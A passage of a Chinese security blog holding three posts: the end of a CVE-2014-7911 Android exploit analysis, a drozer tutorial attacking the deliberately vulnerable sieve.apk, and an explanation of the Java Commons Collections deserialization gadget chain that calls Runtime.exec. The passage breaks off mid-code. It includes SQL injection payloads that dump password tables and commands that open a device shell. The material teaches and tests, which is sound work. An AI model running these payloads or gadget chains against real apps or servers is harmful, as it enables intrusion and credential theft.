<p>注意，<code>android_atomic_dec()</code>执行强引用计数减1，返回的是执行减1操作之前所指定的内存地址存放的值。为了执行<code>refs-&gt;mBase-&gt;onLastStrongRef(id)</code>即<code>blx r2</code>，攻击者需要使<code>refs-&gt;mStrong</code>为1。<br>至此，可以得出攻击者要实现代码执行，需要满足如下条件：<br>1.<code>drl</code>（即<code>mOrgue</code>，第一个可控的指针，在进入<code>decStrong</code>函数时的<code>r0</code>）必须指向可读的内存区域；<br>2.<code>refs-&gt;mStrong</code>必须为1；<br>3.<code>refs-&gt;mBase-&gt;onLastStrongRef(id)</code>需要执行。并最终指向可执行的内存区域。<br>即满足如下伪代码：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (*(*(mOrgue+<span class="number">4</span>)) == <span class="number">1</span>) &#123;</span><br><span class="line">    refs = *(mOrgue+<span class="number">4</span>)</span><br><span class="line">    r2 = *(*(*(refs+<span class="number">8</span>))+<span class="number">12</span>)</span><br><span class="line">    blx r2 -----&gt;获取控制权</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了成功获得任意代码执行，攻击者需要克服Android中的漏洞缓解技术：<code>ASLR</code>和<code>DEP</code>。可以使用堆喷射、堆栈转移（stack pivoting）和ROP等技术。<br>通过学习这种多种技术结合的Android系统漏洞，我发现自己欠缺的知识太多，其中随便一个知识点都够写一篇文章的了，不过也能惊喜的发现以前学过的知识说不定就用到了。<br><strong>reference</strong><br>cve-2014-7911安卓提权漏洞分析 by 小荷才露尖尖角</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/04/26/drozer%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/04/26/drozer%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" class="post-title-link" itemprop="url">drozer使用说明</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-04-26 17:04:07" itemprop="dateCreated datePublished" datetime="2017-04-26T17:04:07+08:00">2017-04-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>按照<a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/tools/drozer/">官网</a>上的安装步骤安装后，原本可以使用，但是Mac升级后drozer连接时总是出现错误：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Errno 35] &#39;Resource temporarily unavailable&#39;</span><br></pre></td></tr></table></figure>
<p>网上查了好多，没有解决办法，最后决定重新编译安装github上的<a target="_blank" rel="noopener" href="https://github.com/mwrlabs/drozer">drozer</a>源码。<br>安装过程中发现缺少了很多库，应该是缺少环境所以会连接错误。<br>主要错误是：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zipimport.ZipImportError: can’t decompress data; zlib not available</span><br></pre></td></tr></table></figure>
<p>和  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal error: &#39;openssl&#x2F;opensslv.h&#39; file not found</span><br></pre></td></tr></table></figure>
<p>需要重新编译安装<a target="_blank" rel="noopener" href="http://www.zlib.net/">zlib</a>、<a target="_blank" rel="noopener" href="https://www.openssl.org/source">openssl</a>两个库，因为Mac升级后好像不支持<code>openssl</code>的头文件了。安装后还需要重新编译安装python源码，以加入<code>zlib</code>和<code>ssl</code>的支持。<br>drozer编译过程中还会提示缺少其他python库，使用：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo pip install twisted&#x3D;&#x3D;10.2.0</span><br></pre></td></tr></table></figure>
<p>进行安装即可，这里要注意一定要按照错误提示指定安装库的版本，因为drozer只认这个版本，高于或低于都会报错。</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p><strong>运行drozer会话</strong>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ adb forward tcp:31415 tcp:31415 #adb forward tcp:local_port tcp:remote_port</span><br><span class="line">$ drozer console connect</span><br><span class="line">Selecting 98e42f04e96ae748 (LGE AOSP on HammerHead 4.4.4)</span><br><span class="line"></span><br><span class="line">            ..                    ..:.</span><br><span class="line">           ..o..                  .r..</span><br><span class="line">            ..a..  . ....... .  ..nd</span><br><span class="line">              ro..idsnemesisand..pr</span><br><span class="line">              .otectorandroidsneme.</span><br><span class="line">           .,sisandprotectorandroids+.</span><br><span class="line">         ..nemesisandprotectorandroidsn:.</span><br><span class="line">        .emesisandprotectorandroidsnemes..</span><br><span class="line">      ..isandp,..,rotectorandro,..,idsnem.</span><br><span class="line">      .isisandp..rotectorandroid..snemisis.</span><br><span class="line">      ,andprotectorandroidsnemisisandprotec.</span><br><span class="line">     .torandroidsnemesisandprotectorandroid.</span><br><span class="line">     .snemisisandprotectorandroidsnemesisan:</span><br><span class="line">     .dprotectorandroidsnemesisandprotector.</span><br><span class="line"></span><br><span class="line">drozer Console (v2.4.3)</span><br><span class="line">dz&gt; list # 列出所有模块</span><br><span class="line">app.activity.forintent                   Find activities that can handle the given intent</span><br><span class="line">app.activity.info                        Gets information about exported activities.</span><br><span class="line">app.activity.start                       Start an Activity</span><br><span class="line">app.broadcast.info                       Get information about broadcast receivers</span><br><span class="line">app.broadcast.send                       Send broadcast using an intent</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>出现<code>dz&gt;</code>提示符说明连接成功。<br><strong>枚举安装的包</strong>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.list # 列出设备中所有已安装的包</span><br><span class="line">dz&gt; run app.package.list -f [app name]</span><br><span class="line">dz&gt; run app.package.info -h # show UID&#x2F;Permission etc.</span><br><span class="line">...</span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help</span><br><span class="line">  -a PACKAGE, --package PACKAGE</span><br><span class="line">                        the identifier of the package to inspect</span><br><span class="line">  -d DEFINES_PERMISSION, --defines-permission DEFINES_PERMISSION</span><br><span class="line">                        filter by the permissions a package defines</span><br><span class="line">  -f FILTER, --filter FILTER</span><br><span class="line">                        keyword filter conditions</span><br><span class="line">  -g GID, --gid GID     filter packages by GID</span><br><span class="line">  -p PERMISSION, --permission PERMISSION</span><br><span class="line">                        permission filter conditions</span><br><span class="line">  -u UID, --uid UID     filter packages by UID</span><br><span class="line">  -i, --show-intent-filters</span><br><span class="line">                        show intent filters</span><br></pre></td></tr></table></figure>
<p>其他的命令也都可以通过<code>-h</code>参数查看使用说明。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 枚举activity</span><br><span class="line">dz&gt; run app.activity.info -h</span><br><span class="line"># 枚举content provider</span><br><span class="line">dz&gt; run app.provider.info -h</span><br><span class="line"># 枚举service</span><br><span class="line">dz&gt; run app.service.info -h</span><br><span class="line"># 枚举broadcast receiver，动态注册的不能显示</span><br><span class="line">dz&gt; run app.broadcast.info -h</span><br></pre></td></tr></table></figure>
<p><strong>确定应用的受攻击面</strong>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface [package name]</span><br></pre></td></tr></table></figure>
<p><strong>运行Activity</strong>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.activity.start --action android.intent.action.MAIN --category android.intent.category.LAUNCHER --component com.example.hello com.example.hello.MainActivity</span><br></pre></td></tr></table></figure>
<p><strong>运行Service</strong>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.service.start --component com.linkedin.android com.linkedin.android.authenticator.AuthenticationService</span><br></pre></td></tr></table></figure>

<h2 id="用drozer做渗透测试"><a href="#用drozer做渗透测试" class="headerlink" title="用drozer做渗透测试"></a>用drozer做渗透测试</h2><blockquote>
<p>从官网下载演示的漏洞APP <a target="_blank" rel="noopener" href="https://www.mwrinfosecurity.com/system/assets/380/original/sieve.apk">sieve.apk</a><br>A ‘Password Manager’ App, showcasing some common Android vulnerabilities.</p>
</blockquote>
<p>在手机上安装这个APP后，用drozer进行渗透测试。<br>1.获取包名  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.list -f sieve</span><br></pre></td></tr></table></figure>
<p>2.获取应用的基本信息  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
<p>3.确定attack surface  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
<p>4.Activity<br>(1) 获取Activity信息  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.activity.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
<p>(2) 启动Activity  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.activity.start --component com.mwr.example.sieve</span><br><span class="line">dz&gt; help app.activity.start</span><br></pre></td></tr></table></figure>
<p>5.Content Provider<br>(1) 获取Content Provider信息  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
<p>(2) Content Provider数据泄露<br>先获取所有可以访问的Uri：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
<p>获取各个Uri的数据  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --vertical</span><br></pre></td></tr></table></figure>
<p>查询到数据说明存在漏洞<br>(3)Content Provider SQL注入  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --projection &quot;&#39;&quot;</span><br><span class="line">dz&gt; run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --selection &quot;&#39;&quot;</span><br></pre></td></tr></table></figure>
<p>报错说明存在SQL注入<br>列出所有表：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --projection &quot;* from sqlite_master where type&#x3D;&#39;table&#39;;--&quot;</span><br></pre></td></tr></table></figure>
<p>获取某个表中的数据  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --projection &quot;* from Key;--&quot;</span><br></pre></td></tr></table></figure>
<p>(4) 同时检测SQL注入和目录遍历  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run scanner.provider.injection -a com.mwr.example.sieve</span><br><span class="line">dz&gt; run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
<p>6.Service<br>获取Service详情  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.service.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
<p>不使用drozer启动service  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell@hammerhead:&#x2F;$ am startservice -n package.name&#x2F;.SerivceName</span><br></pre></td></tr></table></figure>
<p>7.Broadcast Receiver  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.broadcast.info # 获取broadcast receiver信息</span><br><span class="line">dz&gt; run app.broadcast.send # 通过intent发送broadcast receiver</span><br></pre></td></tr></table></figure>
<p>8.文件操作<br>列出指定文件路径里全局可写/可读的文件  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run scanner.misc.writablefiles --privileged &#x2F;data&#x2F;data&#x2F;com.sina.weibo</span><br><span class="line">dz&gt; run scanner.misc.readablefiles --privileged &#x2F;data&#x2F;data&#x2F;com.sina.weibo</span><br><span class="line">dz&gt; run app.broadcast.send --component 包名 --action android.intent.action.XXX</span><br></pre></td></tr></table></figure>
<p>9.其他模块  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; shell.start # 在设备上开启一个交互shell</span><br><span class="line">dz&gt; tools.file.upload &#x2F; tools.file.download #上传&#x2F;下载文件到设备</span><br><span class="line">dz&gt; tools.setup.busybox &#x2F; tools.setup.munimalsu #安装可用的二进制文件</span><br></pre></td></tr></table></figure>
<p><strong>reference</strong><br>《Android安全攻防实战》<br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/goodhacker/p/3906180.html?utm_source=tuicool&amp;utm_medium=referral">http://www.cnblogs.com/goodhacker/p/3906180.html?utm_source=tuicool&amp;utm_medium=referral</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/04/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/04/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Java反序列化漏洞（二）漏洞原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-04-24 00:37:21" itemprop="dateCreated datePublished" datetime="2017-04-24T00:37:21+08:00">2017-04-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="使用Java反序列化的场景"><a href="#使用Java反序列化的场景" class="headerlink" title="使用Java反序列化的场景"></a>使用Java反序列化的场景</h2><p>breenmachine在<a target="_blank" rel="noopener" href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">foxglovesecurity analysis</a>中列出了以下会使用Java反序列化的场景。<br><strong>Java loves sending serialized objects all over the place. For example:</strong></p>
<ul>
<li><strong>In Http requests</strong> - Parameters, ViewState, Cookies, you name it.</li>
<li><strong>RMI</strong> - The extensively used Java RMI protocol is 100% based on serialization.</li>
<li><strong>RMI over HTTP</strong> - Many Java thick client web apps use this - again 100% serialized objects.</li>
<li><strong>JMX</strong> - Again, relies on serialized objects being shot over the wire.</li>
<li><strong>Custom Protocols</strong> - Sending an receiving raw Java objects is the norm - which we’ll see in some of the exploits to come.</li>
</ul>
<h2 id="可能存在Java反序列化漏洞的场景"><a href="#可能存在Java反序列化漏洞的场景" class="headerlink" title="可能存在Java反序列化漏洞的场景"></a>可能存在Java反序列化漏洞的场景</h2><p>Java中间件通常通过网络接收客户端发送的序列化数据，Java中间件在对序列化数据进行反序列化数据时，会调用被序列化对象的<code>readObject()</code>。如果某个对象的<code>readObject()</code>中能够执行任意代码，那么Java中间件在对其进行反序列化时，也会执行对应的代码。如果能够找到满足上述条件的对象进行序列化并发送给Java中间件，Java中间件也会执行指定的代码，即存在反序列化漏洞。<br>Java反序列化漏洞需要满足两个条件：<br>1.Java中间件需要存在客户端进行序列化时使用的类，否则服务器在进行反序列化时会出现ClassNotFoundException异常；<br>2.客户端选择的进行序列化的类在执行代码时，不会进行任何验证或限制，会完全按照要求执行。<br>利用Java反序列化漏洞可使服务器执行任意代码，可以直接控制服务器。<br>本文中分析的是commons-collections-3.2.2.jar，JDK版本是1.8.</p>
<h2 id="利用ChainedTransformer执行代码"><a href="#利用ChainedTransformer执行代码" class="headerlink" title="利用ChainedTransformer执行代码"></a>利用ChainedTransformer执行代码</h2><p>以下为利用<code>org.apache.commons.collections.functors.ChainedTransformer</code>类执行任意代码的示例，当执行最后的<code>chain.transform(chain);</code>后，会执行传入的<code>Transformer</code>数组指定的代码。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CTExec</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers_exec_note = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;/usr/bin/open /Applications/Notes.app&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec_note);</span><br><span class="line">            <span class="comment">// 能够执行指定的代码</span></span><br><span class="line">            chain.transform(chain);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在执行最后的<code>chain.transform(chain);</code>方法时，会首先调用<code>ConstantTransformer.transform()</code>获取其构造函数中传入的类，再依次调用<code>InvokeTransformer.transform()</code>执行其构造函数中传入的方法，等价于<a target="_blank" rel="noopener" href="http://pwn4.fun/2017/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">上一篇文章</a>中”使用Java反射机制调用Runtime类执行程序”的那段代码。<br><code>ConstantTransformer</code>类、<code>InvokerTransformer</code>类和<code>ChainedTransformer</code>类的相关代码如下。<br><strong>ConstantTransformer类的相关代码</strong></p>
<p><code>ConstantTransformer</code>类的<code>transform()</code>会返回构造函数传入的参数。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transfomer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>InvokerTransformer类的相关代码</strong></p>
<p><code>InvokerTransformer</code>类的<code>transform()</code>可以通过Java反射机制执行指定的代码，能指定所需执行的类、方法及参数，且在<code>transform()</code>中未进行任何验证或限制。<code>transform()</code>中执行的代码的方法名、参数类型及参数值在<code>InvokerTransformer</code>类的构造函数中指定。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes,</span></span></span><br><span class="line"><span class="function"><span class="params">         Object[] args)</span> </span>&#123;</span><br><span class="line">         <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">         <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">         <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ChainedTransformer类的相关代码</strong></p>
<p><code>ChainedTransformer</code>类的带参数构造函数中，会将参数中的<code>ConstantTransformer</code>与<code>InvokeTransformer</code>数组保存为<code>this.iTransformers</code>对象。在<code>ChainedTransformer</code>类的<code>transform()</code>中，会依次调用<code>this.iTransformers</code>对应的<code>ConstantTransformer</code>与<code>InvokerTransformer</code>数组的<code>transform()</code>，且前一次执行<code>transform()</code>的返回值object，会作为下一次执行<code>transform()</code>的参数object。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">   